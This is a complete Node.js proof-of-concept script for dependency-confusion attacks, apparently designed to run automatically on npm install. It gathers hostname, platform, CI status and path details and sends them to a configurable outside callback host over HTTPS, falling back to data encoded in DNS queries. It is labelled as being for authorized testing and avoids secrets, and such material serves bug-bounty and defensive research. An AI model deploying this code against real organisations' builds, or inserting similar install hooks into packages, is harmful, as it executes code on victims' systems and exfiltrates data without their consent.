/**
 * Dependency Confusion PoC - Callback Script
 * Author: OFJAAAH
 *
 * FOR AUTHORIZED SECURITY TESTING ONLY
 *
 * This script sends a benign callback to prove code execution during
 * npm install. It only collects non-sensitive metadata for verification.
 */

const https = require('https');
const http = require('http');
const os = require('os');
const dns = require('dns');

// Configuration - Replace with your Interactsh/callback URL
const CALLBACK_URL = process.env.CALLBACK_URL || 'REPLACE_WITH_INTERACTSH_URL';
const PACKAGE_NAME = process.env.npm_package_name || 'unknown-package';

// Collect ONLY non-sensitive metadata for PoC verification
function collectMetadata() {
  return {
    // Package info
    package: PACKAGE_NAME,
    version: process.env.npm_package_version || '99.0.0',

    // Non-sensitive system info (proves execution environment)
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    nodeVersion: process.version,

    // Timestamp
    timestamp: new Date().toISOString(),

    // Environment type (CI/local)
    isCI: !!(process.env.CI || process.env.GITHUB_ACTIONS || process.env.GITLAB_CI ||
             process.env.JENKINS_URL || process.env.TRAVIS || process.env.CIRCLECI),

    // Working directory (relative path only)
    cwd: process.cwd().split('/').slice(-2).join('/'),

    // Proof of execution
    poc: 'dependency-confusion-hunter-by-ofjaaah'
  };
}

// Send callback via HTTPS
function sendCallback(data) {
  const payload = JSON.stringify(data);

  // Try HTTPS POST first
  if (CALLBACK_URL.startsWith('https://')) {
    const url = new URL(CALLBACK_URL);

    const options = {
      hostname: url.hostname,
      port: url.port || 443,
      path: url.pathname + url.search,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
        'User-Agent': 'DependencyConfusionPoC/1.0'
      },
      timeout: 5000
    };

    const req = https.request(options, (res) => {
      console.log(`[PoC] Callback sent - Status: ${res.statusCode}`);
    });

    req.on('error', (e) => {
      // Silently fail - don't break the install
      tryDNSCallback(data);
    });

    req.on('timeout', () => {
      req.destroy();
      tryDNSCallback(data);
    });

    req.write(payload);
    req.end();
  } else {
    // Try DNS exfiltration as fallback (works even with firewall)
    tryDNSCallback(data);
  }
}

// DNS-based callback (for environments that block HTTP)
function tryDNSCallback(data) {
  if (!CALLBACK_URL.includes('.oast.') && !CALLBACK_URL.includes('interact')) {
    return; // Only use DNS for Interactsh-style URLs
  }

  try {
    // Extract base domain from Interactsh URL
    const baseDomain = CALLBACK_URL.replace(/^https?:\/\//, '').split('/')[0];

    // Encode minimal data in subdomain
    const encodedData = Buffer.from(JSON.stringify({
      pkg: PACKAGE_NAME,
      host: os.hostname().substring(0, 20),
      ts: Date.now()
    })).toString('base64').replace(/[+/=]/g, '').substring(0, 60);

    const dnsQuery = `${encodedData}.${baseDomain}`;

    dns.resolve4(dnsQuery, (err) => {
      // DNS query sent - callback received by Interactsh
      if (!err) {
        console.log('[PoC] DNS callback sent');
      }
    });
  } catch (e) {
    // Silently fail
  }
}

// Main execution
function main() {
  console.log('');
  console.log('╔══════════════════════════════════════════════════════════════╗');
  console.log('║  DEPENDENCY CONFUSION VULNERABILITY DETECTED!                 ║');
  console.log('║  This package was installed from a PUBLIC registry.          ║');
  console.log('║                                                               ║');
  console.log('║  If you see this message, your build system is vulnerable    ║');
  console.log('║  to dependency confusion attacks.                            ║');
  console.log('║                                                               ║');
  console.log('║  PoC by: OFJAAAH                                             ║');
  console.log('║  Tool: Dependency Confusion Hunter                           ║');
  console.log('╚══════════════════════════════════════════════════════════════╝');
  console.log('');
  console.log(`Package: ${PACKAGE_NAME}`);
  console.log(`Hostname: ${os.hostname()}`);
  console.log(`Platform: ${os.platform()} ${os.arch()}`);
  console.log(`Time: ${new Date().toISOString()}`);
  console.log('');

  // Send callback if URL is configured
  if (CALLBACK_URL && CALLBACK_URL !== 'REPLACE_WITH_INTERACTSH_URL') {
    const metadata = collectMetadata();
    sendCallback(metadata);
  }
}

// Execute
main();
